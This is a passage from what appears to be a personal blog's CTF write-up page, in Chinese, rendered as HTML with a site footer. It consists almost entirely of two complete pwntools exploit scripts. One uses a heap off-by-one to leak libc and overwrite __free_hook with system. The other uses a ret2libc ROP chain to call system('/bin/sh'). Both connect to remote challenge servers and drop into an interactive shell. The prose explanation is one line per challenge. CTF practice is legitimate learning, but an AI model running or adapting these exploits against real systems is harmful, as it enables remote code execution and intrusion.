+<pre><code>update_story`存在`off-by-one`，伪造个大chunk覆盖两个小chunk，然后leak `libc`，覆写`fd`打`__free_hook
+</code></pre>
+<pre><code class="c">
+from pwn import *
+
+context.update(os = &#39;linux&#39;, arch = &#39;amd64&#39;)
+
+context.log_level = &#39;debug&#39;
+
+binary = &#39;./journey_story&#39;
+
+elf = ELF(binary, checksec=False)
+
+DEBUG = 0
+
+if DEBUG:
+
+  libc = elf.libc
+
+  p = process(binary)
+
+else:
+
+  libc = ELF(&#39;./libc-2.31.so&#39;, checksec=False)
+
+  host = &#39;39.106.48.123&#39;
+
+  port = &#39;41557&#39;
+
+  p = remote(host,port)
+
+sla = lambda delim, data:   p.sendlineafter(delim, data)
+
+sa  = lambda delim, data:   p.sendafter(delim, data)
+
+s  = lambda data:       p.send(data)
+
+sl  = lambda data:       p.sendline(data)
+
+ru  = lambda delim, **kwargs: p.recvuntil(delim, **kwargs)
+
+io  = lambda:         p.interactive()
+
+log = lambda name, data:    success(f&#39;&#123;name&#125;: &#123;data:#x&#125;&#39;)
+
+def cmd(idx):
+
+  sla(b&quot;option: &quot;, str(idx).encode())
+
+def add(sz, data=b&#39;&#39;):
+
+  cmd(1)
+
+  sla(b&quot;): &quot;, hex(sz).encode())
+
+  sla(b&quot;): &quot;, data)
+
+def delete(idx):
+
+  cmd(2)
+
+  sla(b&quot;): &quot;, str(idx).encode())
+
+def edit(idx, data):
+
+  cmd(3)
+
+  sla(b&quot;): &quot;, str(idx).encode())
+
+  sa(b&quot;): &quot;, data)
+
+def show():
+
+  cmd(4)
+
+def pwn():
+
+  add(0x58)# 0
+
+  add(0x58)# 1
+
+  add(0x58)# 2
+
+  for i in range(3, 10):
+
+​    add(0xb0, str(i).encode())# 3-9
+
+  edit(0, 0x58*b&#39;\x00&#39; + p8(0xc1))
+
+  for i in range(3, 10):
+
+​    delete(i)
+
+  delete(1)
+
+  add(0x58)# 1
+
+  show()
+
+  libc.address = u64(ru(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - 0x1ecbe0
+
+  __free_hook = libc.sym[&quot;__free_hook&quot;]
+
+  system = libc.sym[&quot;system&quot;]
+
+  log(&quot;libc&quot;, libc.address)
+
+  add(0x58)# 3
+
+  delete(0)
+
+  delete(2)
+
+  edit(3, p64(__free_hook) + b&#39;\n&#39;)
+
+  add(0x58, b&#39;/bin/sh\x00&#39;)# 0 &amp; 3
+
+  add(0x58, p64(system))# 2
+
+  delete(0)
+
+  io()
+
+pwn()
+
+</code></pre>
+<h3><span id="题目名称-open-working">题目名称 ｜ OPEN ｜ Working:</span></h3><p><strong># clock_in</strong></p>
+<p>常规<code>ret2libc</code></p>
+<pre><code class="python">
+from pwn import *
+
+context.update(os = &#39;linux&#39;, arch = &#39;amd64&#39;)
+
+context.log_level = &#39;debug&#39;
+
+binary = &#39;./clock_in&#39;
+
+elf = ELF(binary, checksec=False)
+
+DEBUG = 0
+
+if DEBUG:
+
+  libc = elf.libc
+
+  p = process(binary)
+
+else:
+
+  libc = ELF(&#39;./libc.so.6&#39;, checksec=False)
+
+  host = &#39;101.200.61.16&#39;
+
+  port = &#39;24606&#39;
+
+  p = remote(host,port)
+
+sla = lambda delim, data:   p.sendlineafter(delim, data)
+
+sa  = lambda delim, data:   p.sendafter(delim, data)
+
+s  = lambda data:       p.send(data)
+
+sl  = lambda data:       p.sendline(data)
+
+ru  = lambda delim, **kwargs: p.recvuntil(delim, **kwargs)
+
+io  = lambda:         p.interactive()
+
+log = lambda name, data:    success(f&#39;&#123;name&#125;: &#123;data:#x&#125;&#39;)
+
+pop_rdi_ret = 0x00000000004011c5
+
+ret = pop_rdi_ret + 1
+
+def pwn():
+
+  ru(b&quot;info: \n&quot;)
+
+  \# gdb.attach(p, &quot;b *0x401251&quot;)
+
+  pay = b&#39;\x00&#39;*0x48 + fit(pop_rdi_ret, elf.got[&quot;puts&quot;], elf.plt[&quot;puts&quot;], elf.sym[&quot;get_info&quot;])
+
+  sl(pay)
+
+  ru(b&quot;Thank you! You entered:\n&quot;)
+
+  libc.address = u64(ru(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - libc.sym[&quot;puts&quot;]
+
+  system = libc.sym[&quot;system&quot;]
+
+  binsh = next(libc.search(b&quot;/bin/sh&quot;))
+
+  log(&quot;libc&quot;, libc.address)
+
+  ru(b&quot;info: \n&quot;)
+
+  pay = b&#39;\x00&#39;*0x48 + fit(ret, pop_rdi_ret, binsh, system)
+
+  sl(pay)
+
+  io()
+
+pwn()
+</code></pre>
+<h3><span id="题目名称-open-working">题目名称 ｜ OPEN ｜ Working:</span></h3>
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2024 - 2024 huanghunr&#39;s Blog
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;huanghunr
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
